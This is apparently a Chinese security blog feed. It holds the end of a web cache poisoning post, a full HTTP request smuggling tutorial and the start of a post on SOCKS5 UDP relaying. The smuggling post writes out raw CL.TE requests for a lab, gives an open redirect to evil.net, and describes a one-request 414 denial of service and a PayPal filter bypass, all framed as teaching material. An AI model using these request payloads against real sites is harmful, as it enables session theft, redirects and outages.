href="https://blog.cloudflare.com/understanding-our-cache-and-the-web-cache-deception-attack/">CloudFlare缓存机制</a></p><p>所以我们需要使用如下的请求</p><p><img src="/image/Web-Cache-Poisoning/og3.jpg" alt="og3"></p><p> 此时就可以使得此响应被服务器缓存</p><p> 这样就导致了所有在此页面上使用分享功能的用户最终都会分享攻击者所指定的地址</p><p> <video src="/img/Web-Cache-Poisoning/hijack.mp4" width="1000px" height="1000px" controls="controls"></video></p><h2 id="本地路由中毒"><a href="#本地路由中毒" class="headerlink" title="本地路由中毒"></a>本地路由中毒</h2><p>除了X-Forwarded-For等标头以外，实际上还有许多神奇的标头可以实现缓存毒化</p><p>就比如我之前使用到的X-Original-URL，其和X-Rewrite-URL一样，都可以“强制”转变请求路径，且这一路径的转变是缓存服务器所“看不见”的</p><p>就拿Drupal框架来说，以下两个请求将是等价的，但是很明显，服务器对此的响应却是完全不同</p><p><img src="/image/Web-Cache-Poisoning/drupal1.jpg" alt="drupal1"></p><p><img src="/image/Web-Cache-Poisoning/drupal2.jpg" alt="drupal2"></p><p>那么，我们就可以利用这一特性来欺骗应用程序提供完全超出预期的页面，比如下图</p><p><img src="/image/Web-Cache-Poisoning/local-route1.jpg" alt="local-route1"></p><p>如果我们发送这样的请求，那么对于前端缓存服务器来说，其所看到的是/education?x=y，但是实际后端服务器解析的访问路径却是/gambling?x=y</p><p>这样就会使得每一个访问/education?x=y路径的用户意外的得到/gambling?x=y的页面</p><p>当然，除了对于路径的毒化之外，缓存也有可能被毒化查询参数</p><p><img src="/image/Web-Cache-Poisoning/local-route2.jpg" alt="local-route2"></p><p>这样的话，我们将有机会诱导受害者查询非预期的结果</p><p>另外，如果遇到利用重定向来导入js文件的网站，如果存在缓存毒化漏洞，那么攻击者就有可能劫持js文件的加载，强迫受害者加载外部恶意js文件</p><h2 id="Drupal开放式重定向"><a href="#Drupal开放式重定向" class="headerlink" title="Drupal开放式重定向"></a>Drupal开放式重定向</h2><p>首先，Drupal框架存在这样的一个问题，即如下的请求将会导致Drupal框架错误的将用户导向任意一个外部网站</p><p><img src="/image/Web-Cache-Poisoning/drupal-or.jpg" alt="drupal-or"></p><p>那么，配合缓存毒化漏洞，将会有意想不到的结果</p><p>首先我们先发送如下请求，毒化Drupal的内置缓存</p><p><img src="/image/Web-Cache-Poisoning/drupal-posion-internal.jpg" alt="drupal-posion-internal"></p><p>这样，drupal在接到访问/redir路径的请求时，将会直接返回指向外部恶意网站的302重定向响应</p><p>接着我们毒化外部缓存</p><p><img src="/image/Web-Cache-Poisoning/drupal-posion-external.jpg" alt="drupal-posion-external"></p><p>此时，外部任意用户访问/download路径都将会被后端的Drupal缓存认为在访问/redir，从而返回恶意的302响应，并被外部缓存服务器所缓存</p><p>这样，我们就可以基于此向受害者下发恶意软件，导致极大的风险</p><h2 id="一个请求瘫痪网站"><a href="#一个请求瘫痪网站" class="headerlink" title="一个请求瘫痪网站"></a>一个请求瘫痪网站</h2><p>听起来貌似不太可能，但是如果目标网站有着缓存毒化漏洞，那么这是完全可能的</p><p>假想以下一个请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index?v&#x3D;test HTTP&#x2F;1.1</span><br><span class="line">Host: example.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: &#x2F;index&#x2F;?v&#x3D;test</span><br></pre></td></tr></table></figure><p>再尝试发一个请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index HTTP&#x2F;1.1</span><br><span class="line">Host: example.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: &#x2F;index&#x2F;?v&#x3D;test</span><br></pre></td></tr></table></figure><p>我们可以看到，服务器将301缓存了起来，但是由于我们只能污染查询参数，所以在这看来并没有什么用处</p><p>但是，仔细想想，你会发现实际上我们可以利用一个很少见的http状态码—414</p><p>我们发送以下的请求，将url填充至最大字节，且假设响应被缓存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index?v&#x3D;&lt;long-string&gt; HTTP&#x2F;1.1</span><br><span class="line">Host: example.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: &#x2F;index&#x2F;?v&#x3D;&lt;long-string&gt;</span><br></pre></td></tr></table></figure><p>那么当有人访问index时，会得到如下响应</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index HTTP&#x2F;1.1</span><br><span class="line">Host: example.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: &#x2F;index&#x2F;?v&#x3D;&lt;long-string&gt;</span><br></pre></td></tr></table></figure><p>那么这时，你会发现在重定向时，301响应为我们补全了index后的/符号</p><p>这就导致了如果受害者的浏览器收到这样的重定向响应后，由于本身url已经是最大值，而此时301响应多补了一个/，这就导致了url过长，使得任何一个用户访问index，都会得到一个HTTP 414响应</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index&#x2F;?v&#x3D;&lt;long-string&gt; HTTP&#x2F;1.1</span><br><span class="line">Host: example.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 414 Request-URI Too Large</span><br><span class="line">CF-Cache-Status: MISS</span><br></pre></td></tr></table></figure><p>这就造成了拒绝服务攻击，而且这仅仅需要一个请求</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>没啥好说的，骚就完事了</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP Smuggling攻击</title>
      <link href="HTTP-Smuggling.html"/>
      <url>HTTP-Smuggling.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>实际上HTTP Smuggling已经不是一个很新的攻击技术，早在2005年，就已经有人提出过这一攻击方式，只是这一攻击方式普遍被认为过于复杂以及难以利用于实战，故而在被提出后并没有受到太多的重视</p><p>然而，往往人们不看好的东西会有着巨大的财富</p><p>借用albinowax的原话:</p><p><strong>If a technique has a reputation for being difficult, fiddly, or dangerous, that’s a topic in dire need of further research. After repeatedly experiencing breakthroughs due to being pressured into exploring topics well outside my comfort zone, I’ve decided that the fastest route to novel findings is actively seeking out topics that make you uncomfortable. Chances are, these topics are avoided by other hackers, giving them serious research potential. To me, this is the only plausible explanation for why I was able to take a technique first documented in 2005, and presented again at DEF CON in 2016, and use it to earn $70k in bounties in 2019.</strong></p><p>所以，好好研究，没有不好用的攻击技术，只有你不会玩的～</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>HTTP偷渡(HTTP Smuggling)的原理可以简单用下面两张图来解释:</p><p>首先是正常环境下的，用户访问一个带有反代服务器的网站:</p><p><img src="/image/HTTP-Smuggling/normal-reverse-proxy.jpg" alt="normal"></p><p>可以看到，由于HTTP / 1.1的兴起，反向代理服务器往往会将多个用户的请求通过单个的tcp链接串联在一起发送至后端服务器，实际上这一方法本身是无害的，只要前后端对于每一个消息的开始、结束位置达成一致，那么这一技术会大大减轻前后端服务器的负载，加快数据传输的效率。</p><p>但是，这也成为了一个薄弱的环节，因为这就意味着前后端必须对每个消息的结束位置达成一致，如果无法达成一致，那么就有可能发生如下图的情况:</p><p><img src="/image/HTTP-Smuggling/smuggling-reverse-proxy.jpg" alt="smuggling"></p><p>也就是说攻击者可以构造畸形模糊的请求，使得后端服务器在处理攻击者的请求时只处理了“部分”恶意请求，而把“剩余”的恶意请求以及正常的用户请求视作同一个请求并进行处理，从而劫持用户的请求。</p><p>这种攻击手法，就被称为HTTP偷渡(HTTP Smuggling)技术</p><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>首先，现在的核心问题在于，我们应该如何构造一个所谓的<strong>畸形模糊的请求</strong>？</p><p>这里就要引入一个我们大家都很熟知的概念—Transfer-Encoding</p><p>相信大多数人知道这个概念都是因为我们可以利用Transfer-Encoding绕过waf，但是，实际上这一技术带来了许多神奇的攻击面，包括今天讨论的主角HTTP Smuggling</p><p>我们大家都知道，一个HTTP POST请求当中往往会有一个Content-Length头，这个头标示了此POST请求所携带的数据的长度，而如果我们在一个HTTP请求当中同时添加两个Content-Length头，并且使用不同的值，绝大多数的服务器会直接拒绝这种格式的请求，认为此格式是非法的</p><p>但是，参考RFC 2616规范，如果同时存在Content-Length以及Transfer-Encoding头，文档规定Content-Length头需要被忽略。故而我们可以得知一点：如果一个post请求当中同时携带Content-Length以及Transfer-Encoding头，那么这个请求是合法的，绝大多数的服务器并不会拒绝这样的请求</p><p>那么问题就来了，如果两台服务器对这样的请求，一台服务器不支持Transfer-Encoding，另一台支持，那么，整个系统就不同步了，攻击者可以籍此触发HTTP Smuggling漏洞</p><p>以下两张图可以帮助理解此问题:</p><ul><li>首先我假设前端服务器并不支持Transfer-Encoding，而后端服务器支持，在HTTP Smuggling中，我们往往将这一情况称为CL.​​TE</li></ul><p><img src="/image/HTTP-Smuggling/CL_TE.jpg" alt="CL.​​TE"></p><p>在图中，我们可以看到，由于前端服务器不支持Transfer-Encoding，故而前端服务器只会转发蓝色的文本至后端服务器，而后端服务器由于一直无法收到以0结尾的Transfer-Encoding消息结束块，故而会一直等待，此链接就会超时。</p><ul><li>而如果前端服务器支持Transfer-Encoding，后端服务器不支持，那么在HTTP Smuggling中，这类情况被称为TE.CL</li></ul><p><img src="/image/HTTP-Smuggling/TE_CL.jpg" alt="TE.CL"></p><p>在图中，可以看到由于前端服务器支持Transfer-Encoding，故而前端只会转发蓝色字体部分至后端服务器，而此时由于后端服务器需要读取6个字节长度的数据，需要等待最后一个X的到来，故而此时链接就会超时</p><p>这两种方式都可以用来检测潜在的HTTP Smuggling风险</p><p>那么也许有人会说，这不过就是让自己的链接超时罢了，没有什么大用，如果是这么想的话，看看下图如何？</p><p><img src="/image/HTTP-Smuggling/basic_attack.jpg" alt="Attack"></p><p>从图中可以看到，这是一个CL.​​TE类型的HTTP Smuggling攻击，前端服务器转发了包括蓝色及橙色消息在内的所有消息，而后端服务器在解析的过程中，只解析了蓝色字体部分，这就使得橙色消息被留在了缓冲区中，并与后来的一个受害者请求(绿色字体)合并，称为了一个新的HTTP请求</p><p>也就是说，原本受害者希望向/search路径POST一个请求，但是由于HTTP Smuggling的存在，后端服务器在用户完全不知情的情况下，误认为受害者向/404发出了一个get请求，从而引发了受害者无法访问/search路径的问题。</p><p>而这里的路径是完全可以自定义的，攻击者完全可以利用HTTP Smuggling漏洞迫使受害者加载恶意的外部js或者结合缓存漏洞形成拒绝服务攻击</p><h2 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a>攻击手段</h2><p>上面我简单介绍了一些HTTP Smuggling的基础攻击手段及方式，接下来，我将更深入探讨HTTP Smuggling的更多用法</p><h3 id="窃取“秘密的”HTTP标头"><a href="#窃取“秘密的”HTTP标头" class="headerlink" title="窃取“秘密的”HTTP标头"></a>窃取“秘密的”HTTP标头</h3><p>相信大家都知道，很多反向代理服务器会在代理HTTP请求至后端服务器的同时，附加一些HTTP头，比如我们所熟知的X-Real-IP等等</p><p>这些标头里往往包含有一些比较敏感的信息，因为有些网站会将认证相关的信息附在HTTP头中</p><p>HTTP Smuggling攻击将帮助我们获取这些敏感信息</p><p>首先，我们需要一个存在漏洞的网站(在此例中是CL-TE)并找到一个能够反射出我们输入的参数的端点，比如我们常用的搜索框：</p><p><img src="/image/HTTP-Smuggling/search.jpg" alt="search"></p><p>可以看到，我搜索了“hello”后，上方的提示栏会将我们搜索的内容反射出来</p><p>既然如此，我就可以构造如下的请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxx</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 125</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: https:&#x2F;&#x2F;ac701fe11e21cc0a80c70e6500f4004c.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.125 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: xxx</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,ru;q&#x3D;0.8</span><br><span class="line">Cookie: session&#x3D;nMmCAchGAacq8iL9F1dNu70NqtFYpCfd</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 200</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search&#x3D;hello</span><br></pre></td></tr></table></figure><p>由于CL-TE型漏洞的存在，故而前端将会转发所有的请求字符，但是，后端服务器在解析时，却仅解析了终止符，故而以下的字符被留在了缓冲区中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 200</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search&#x3D;hello</span><br></pre></td></tr></table></figure><p>当我将第一个请求再次发送时，在后端服务器看来，将会变成这个样子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 200</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search&#x3D;helloPOST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxx</span><br><span class="line">Unknown-header:xxxxxxxxx</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 125</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: https:&#x2F;&#x2F;ac701fe11e21cc0a80c70e6500f4004c.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.125 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: xxx</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,ru;q&#x3D;0.8</span><br><span class="line">Cookie: session&#x3D;nMmCAchGAacq8iL9F1dNu70NqtFYpCfd</span><br><span class="line">Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure><p>最终可以看见这样的返回:</p><p><img src="/image/HTTP-Smuggling/search-smuggling.jpg" alt="search-smuggling"></p><p>可以看到，后端服务器误把第二个POST请求当作了HTTP头，返回并暴露了敏感的头信息</p><p>基于此信息，就有机会可以进一步利用内网的api等敏感基础设施</p><h3 id="窃取身份验证信息"><a href="#窃取身份验证信息" class="headerlink" title="窃取身份验证信息"></a>窃取身份验证信息</h3><p>这个和上一个很像，基于同样的原理，我们可以窃取并保存用户的身份验证信息</p><p>发送如下的请求：</p><p><img src="/image/HTTP-Smuggling/cookie.jpg" alt="cookie"></p><p>在此例中，服务器存在TE-CL漏洞，前端服务器将蓝色及橙色字体完整地转发给了后端服务器，而由于后端服务器不支持TE头，故而只能解析蓝色字体部分，橙色字体的部分便被留在了缓冲区中，等待受害者请求(绿色字体)到来时，橙色字体部分将和上一个例子一样，与绿色字体部分相结合，构成一个完整的HTTP请求，从而使得受害者本身的GET请求变为了一个更新个人信息的请求(这里的个人信息是攻击者的个人信息)</p><p>攻击成功后如下:</p><p><img src="/image/HTTP-Smuggling/cookie-smuggling.jpg" alt="cookie-smuggling"></p><p>可以看见，受害者的HTTP头信息被保存在了攻击者的bio中，只需要调节橙色部分的CL长度，就可以将受害者的所有HTTP头全部窃取</p><h3 id="Self-XSS"><a href="#Self-XSS" class="headerlink" title="Self-XSS"></a>Self-XSS</h3><p>相信大家在挖洞的过程中一定遇到过不少的self-xss，这类xss很难被利用，所以往往我们在遇到这类漏洞的时候，会选择直接忽略</p><p>然而，若网站存在HTTP Smuggling漏洞，那么，Self-XSS也将成为威力巨大的武器</p><p>如果一个网站存在HTTP Smuggling漏洞，且其SAML参数容易收到XSS攻击的影响，那么，发送如下的请求：</p><p><img src="/image/HTTP-Smuggling/self-xss.jpg" alt="self-xss"></p><p>解析过程如前两例所示，此时黑色字体将是受害者所获得的HTTP响应，已然被植入了XSS Payload</p><p>借助HTTP Smuggling，Self-XSS也将成为不可忽视的漏洞点</p><h3 id="Open-Redirecting"><a href="#Open-Redirecting" class="headerlink" title="Open-Redirecting"></a>Open-Redirecting</h3><p>同样的，由于我们可以实现Self-XSS，那么，在遇到一些基于DOM的开放重定向时，HTTP Smuggling也能发挥一波</p><p>例如在redhat.com上有一个页面有如下的代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;assets&#x2F;idx?redir&#x3D;&#x2F;&#x2F;redhat.com@evil.net&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: www.redhat.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">var destination &#x3D; getQueryParam(&#39;redir&#39;)</span><br><span class="line">[poor filtering]</span><br><span class="line">document.location &#x3D; destination</span><br></pre></td></tr></table></figure><p>js尝试读取get请求中的redir的值并将网页重定向至其所指向的页面</p><p>此时发送如下的请求：</p><p><img src="/image/HTTP-Smuggling/open-redirect.jpg" alt="open-redirect"></p><p>我们就可以劫持任意用户跳转至我们所希望的网页。</p><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>许多网站会使用CDN技术，并且CDN的提供商也往往提供基于HOST标头，从一个网站访问同一CDN网络上的另一个网站的服务</p><p>那么，我们可以对存在漏洞的网站发送如下的请求:</p><p><img src="/image/HTTP-Smuggling/cdn.jpg" alt="cdn"></p><p>这样我们就可以将原本访问redacted.com的受害者引导至<a href="http://www.redhat.com网站">www.redhat.com网站</a></p><p>更进一步说，我们完全可以使用户加载一个错误且非预期的资源</p><p>SaaS提供商同样适用这一特性</p><h3 id="“帮凶”-Apache和IIS"><a href="#“帮凶”-Apache和IIS" class="headerlink" title="“帮凶” Apache和IIS"></a>“帮凶” Apache和IIS</h3><p>相信大家应该都有注意到基于Apache以及IIS所搭建的网站都有一个这样的特性，就是当你访问一个不以反斜杠结尾的文件夹时，Apache和IIS都将会以HOST标头为基础重定向响应，以此来向文件夹末尾追加斜杠</p><p>比如说这样一个请求:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;test HTTP&#x2F;1.1</span><br><span class="line">Host: example.com</span><br></pre></td></tr></table></figure><p>在发往由Apache以及IIS搭建的网站时，会收到如下的回复</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: https:&#x2F;&#x2F;example.com&#x2F;test&#x2F; </span><br></pre></td></tr></table></figure><p>基于这个看来无害的特性，同时利用HTTP-Smuggling，我们可以使用如下的方式进行攻击:</p><p><img src="/image/HTTP-Smuggling/apache-iis.jpg" alt="apache-iis"></p><p>如图就可以将受害者的请求导向我们所指定的网站，另外，如果目标网站回复的是307的状态码，则可以更进一步，窃取用户POST的敏感数据</p><p>因为307会使得POST请求重新发送至新的目标,但是需要用户的确认，RFC原文为: If the 307 status code is received in response to a request other than GET or HEAD, the user agent MUST NOT automatically redirect the request unless it can be confirmed by the user, since this might change the conditions under which the request was issued</p><h3 id="缓存毒化"><a href="#缓存毒化" class="headerlink" title="缓存毒化"></a>缓存毒化</h3><p>缓存毒化是一个很有趣的话题，我会在之后的blog中详细讨论这个技术，现在，来瞅瞅这一技术如何与HTTP-Smuggling配合，实现惊人的效果</p><p>例如我们向目标网站发出如下请求:</p><p><img src="/image/HTTP-Smuggling/cache-posion.jpg" alt="cache-posion"></p><p>受害者本身是访问/static/site.js的，然而却被我们劫持并访问了自己的账户信息，并且此时这个请求是携带受害者本身的cookie的</p><p>如果此网站存在缓存漏洞，那么在后端服务器返回账户信息的同时，缓存会错误的认为，/static/site.js的响应是受害者/account/settings所返回的信息并将其缓存</p><p>此时，作为攻击者，我们只需要访问/static/site.js这个静态文件，就可以获得受害者的账户信息:</p><p><img src="/image/HTTP-Smuggling/account.jpg" alt="account"></p><h2 id="攻击实例"><a href="#攻击实例" class="headerlink" title="攻击实例"></a>攻击实例</h2><p>接下来的攻击实例是基于albinowax大神对于paypal的攻击</p><h3 id="发现请求走私漏洞"><a href="#发现请求走私漏洞" class="headerlink" title="发现请求走私漏洞"></a>发现请求走私漏洞</h3><p>首先攻击者发现了paypal登录页面上存在请求走私的漏洞，基于此，攻击者可以劫持几乎所有的paypal登陆界面所引用的js文件，如下:</p><p><img src="/image/HTTP-Smuggling/paypal-smuggling.jpg" alt="paypal-smuggling"></p><p>由于paypal使用了CDN，基于我之前介绍的基于CDN的攻击，攻击者可以籍此劫持受害者的js文件至外部网站的恶意js文件</p><p>注意，这里location重定向指向了http网站，而paypal网站是https的，故而无法引入http资源，但是在Safari和IE上有特例,Safari拥有HSTS机制，如果这个转向的网站已经在safari的HSTS缓存中，那么http将自动升级为https；而IE则是可以完全绕过这一限制，在https中引入http资源</p><p>所以本次攻击只对Safari和IE用户生效！</p><h3 id="解决CSP"><a href="#解决CSP" class="headerlink" title="解决CSP"></a>解决CSP</h3><p>但是，由于paypal使用了CSP策略，故而劫持失败了</p><p><img src="/image/HTTP-Smuggling/paypal-csp.jpg" alt="paypal-csp"></p><p>攻击者继续寻找，发现了登陆界面有一个iframe加载了一个c.paypal.com上的子页面，并且此子页面没有使用CSP，同时导入了我们投毒的js文件，这时候攻击者就获得了iframe的完全控制权</p><p><img src="/image/HTTP-Smuggling/paypal-iframe.jpg" alt="paypal-iframe"></p><h3 id="解决同源策略"><a href="#解决同源策略" class="headerlink" title="解决同源策略"></a>解决同源策略</h3><p>但是，此时由于c.paypal.com与paypal.com不同源，同源策略限制了对paypal.com的DOM树的访问</p><p>故而，攻击者进一步查找，终于在paypal.com/us/gifts上找到了一个不使用CSP，且导入了投毒后的js文件的网页，而因为攻击者已经完全控制了iframe，故而攻击者可以将此iframe重定向至paypal.com/us/gifts并第三次触发投毒后的js文件导入，从而籍被污染的js文件来操作paypal.com/signin的界面，获取明文的用户名密码。</p><p><img src="/image/HTTP-Smuggling/paypal-success.jpg" alt="paypal-success"></p><h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><p>paypal修复了这个漏洞，通过将akamai配置为拒绝<code>Transfer-Encoding: chunked</code>来修复此问题</p><p>但是albinowax随后发现，如果将TE头修改成下面这种形式，将可以绕过paypal的缓解措施:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding:</span><br><span class="line">chunked</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>通过学习albinowax大神的文章以及相关的知识，又掌握了一个小小的黑科技hh，其实没有什么没用的漏洞，完全是看利用者的水平，菜刀在高手的手里，也会变成精巧无比的手术刀。</p><p>另外，立个flag，速速把缓存毒化的blog也搞出来hh</p>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Socks5中UDP Associate特性实现与trick</title>
      <link href="Socks5-UDP.html"/>
      <url>Socks5-UDP.html</url>
      
        <content type="html"><![CDATA[<h2 id="RFC文档"><a href="#RFC文档" class="headerlink" title="RFC文档"></a>RFC文档</h2><p>首先要实现这个特性，那么必不可少的，需要去查看这个定义此特性的<a href="https://www.ietf.org/rfc/rfc1928.txt">RFC1928</a></p><p>这里要吐槽一下，由于此RFC文档又使用了传统艺能 – xxx MAY xxx，所以文档对于此功能的描述是模糊的，很多相关问题并没有详细的说明，所以可能各人的实现方法也会有些许的不同，但是大体上还是有一个共识，不会过分影响其核心的功能</p><p>通过阅读此RFC，可以得出主要的几个要点：</p><ul><li>UDP Associate中的每一个UDP Listener生存周期必须与其最初协商时所使用的tcp链接相关，即一个UDP Associate请求最终会对应一条tcp链接和一个UDP Listener，当tcp链接断开时，UDP Listener也将会退出，反之亦然</li><li>在udp客户端发出的UDP Associate请求中应当带上自己期望发送数据的源端口及源地址，而socks5服务器可以选择是否基于此来对数据来源进行限制(RFC原文：The UDP ASSOCIATE request is used to establish an association within the UDP relay process to handle UDP datagrams. The DST.ADDR and DST.PORT fields contain the address and port that the client expects to use to send UDP datagrams on for the association.  The server MAY use this information to limit access to the association.  If the client is not in possesion of the information at the time of the UDP ASSOCIATE, the client MUST use a port number and address of all zeros.)  </li><li>UDP Associate中的所有udp请求都应当带上一个标准的包头，标示此udp包的目的地(供socks5 server解析)以及标示此包的响应者(供UDP Client解析)</li><li>socks5服务器可以选择不处理分片的udp请求，UDP Client应当自己负责重传丢包的问题</li><li>UDP Associate的协商是在最初的TCP连接上实现的，即要用UDP Associate，必须先像TCP Connect一样先打开一个tcp链接来与socks5服务器通讯，完成相关协商后，再打开UDP通讯信道进行实际的UDP包relay</li></ul><p>在以上的几个要点中，第二点有个问题就是很多支持socks5代理的udp客户端并没有严格执行这一标准，在UDP Associate请求包里携带的仍然是目标ip及port，为了保持对这种客户端的兼容，我在具体实现的过程中以第一个向协商后的udp端口发送数据的源ip+port作为标准(因为一般在UDP Associate后，客户端会在极短的时间内向协商好的端口发送数据)，放弃了以UDP Associate包作为标准的尝试。</p><p>另外，虽然RFC文档中没有说明是否一个UDP 